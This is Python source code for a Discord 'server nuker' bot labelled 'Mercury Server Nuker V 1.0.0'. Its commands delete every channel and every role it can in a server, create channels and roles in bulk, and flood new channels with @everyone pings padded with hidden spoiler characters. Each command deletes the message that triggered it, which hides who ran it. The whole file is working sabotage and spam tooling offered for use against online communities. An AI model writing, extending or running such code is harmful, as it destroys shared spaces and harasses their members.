import asyncio
import os
import random
import time

import discord
from colorama import Back, Fore, Style
from discord import utils
from discord.ext import commands
from discord.ext.commands import Bot

bot = Bot(command_prefix=str(input("Prefix: ")))
token = str(input("Token: "))

banner = """
 ███▄ ▄███▓▓█████  ██▀███   ▄████▄   █    ██  ██▀███ ▓██   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██ ▒ ██▒▒██  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒ ▒██ ██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄   ░ ▐██▓░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒   ░██▒░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒ ░ ██▒▓░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░  ██▒▒▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░   ░▒ ░ ▒░▓██ ░▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░      ░      ░     ░░   ░ ░         ░░░ ░ ░   ░░   ░ ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
       ░      ░  ░   ░     ░ ░         ░        ░     ░ ░                 ░    ░     ░  ░      ░  ░   ░     
                           ░                          ░ ░                                                                                                                                                              
Mercury Server Nuker | V 1.0.0
whosaddidix?#1400     
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅

Commands:

    >delchannels                           | Delete all channels
    >mkchannels <iterations> <name>        | Make multiple channels
    >mkchannelsmention <iterations> <name> | Make multiple channels & spam @everyone
    >mkroles <iterations> <name>           | Make multiple roles
    >delroles                              | Attempt to delete all roles 
                                           | (Cannot delete roles above that of the bot's)
    
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅
"""

def clear():
    for i in range(4**4): 
        print("\n")  
    
def slowType(text: str, speed: float, newLine=True):
    for i in text:
        print(i, end="", flush=True)
        time.sleep(speed)
    if newLine: print() 

@bot.event
async def on_ready():
    clear()
    print(Fore.LIGHTCYAN_EX + banner + Style.RESET_ALL)

    print(f"{Fore.LIGHTGREEN_EX}Guilds:")
    for guild in bot.guilds:
        print(f"{Fore.LIGHTCYAN_EX}{guild} | {guild.id}{Style.RESET_ALL}")
    
    print(f"\n{Fore.LIGHTGREEN_EX}Bot Token: \n{Fore.LIGHTCYAN_EX}{token}{Style.RESET_ALL}")
    
    slowType("\n\nClient Ready\n\nConsole:\n", .1)

class commands(): 
    @bot.command()
    async def delchannels(ctx):
        await ctx.message.delete()   
        print(f"{Fore.LIGHTCYAN_EX}[Initiated] >delchannels initiated")
        guild = ctx.guild
        for c in ctx.guild.channels:
            try:
                await c.delete()
                # time.sleep(1/15)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[Error] {e}")
                break
            
        print(f"{Fore.LIGHTGREEN_EX}[Finished] Deleted channels")
        
        await guild.create_text_channel(f"-")
        
    @bot.command()
    async def mkchannels(ctx, iterations, name):
        await ctx.message.delete()   
        print(f"{Fore.LIGHTCYAN_EX}[Initiated] >mkchannels initiated (Args: {iterations}, {name})")
        guild = ctx.guild
        for i in range(int(iterations)):
            try:
                await guild.create_text_channel(f"{name}")
                # time.sleep(1/15)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[Error] {e}")
                break
        print(f"{Fore.LIGHTGREEN_EX}[Finished] Made '{iterations}' channels named '{name}'")   

    @bot.command()
    async def mkchannelsmention(ctx, iterations, name):
        await ctx.message.delete()   
        print(f"{Fore.LIGHTCYAN_EX}[Initiated] >mkchannelsmention initiated (Args: {iterations}, {name})")
        guild = ctx.guild
        for i in range(int(iterations)):
            try:
                u_name = f"{name}-{i}"
                await guild.create_text_channel(u_name)

                channel = discord.utils.get(ctx.guild.channels, name=u_name)
                channel_id = channel.id
                chan = bot.get_channel(channel_id)

                for i in range(5):
                    message = ""
                    
                    for i in range(200):
                        message += "||​||"
                        
                    message += (f"@everyone")
                    
                    await chan.send(message)
                    
                    time.sleep(1/15)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[Error] {e}")
                break
        print(f"{Fore.LIGHTGREEN_EX}[Finished] Made & spammed '{iterations}' channels named '{name}'")  
        
    @bot.command()
    async def mkroles(ctx, iterations, name):
        await ctx.message.delete()   
        print(f"{Fore.LIGHTCYAN_EX}[Initiated] >mkroles initiated (Args: {iterations}, {name})")
        guild = ctx.guild
        for i in range(int(iterations)):
            try:
                await guild.create_role(name=name)
                # time.sleep(1/15)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[Error] {e}")
                break
            
        print(f"{Fore.LIGHTGREEN_EX}[Finished] Made '{iterations}' roles named '{name}'")
        
    @bot.command()
    async def delroles(ctx):
        await ctx.message.delete()   
        print(f"{Fore.LIGHTCYAN_EX}[Initiated] >delroles initiated")
        for role in ctx.guild.roles: 
            try: 
                try:  
                    await role.delete()
                except:
                    print(f"{Fore.LIGHTYELLOW_EX}[Notice] Cannot delete {role.name} (passing)")
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[Error] {e}")
                break
        
        print(f"{Fore.LIGHTGREEN_EX}[Finished] Deleted roles")       

    @bot.command(pass_context=True)
    async def deletethis(ctx):
        await ctx.message.delete()    


          
bot.run(token)
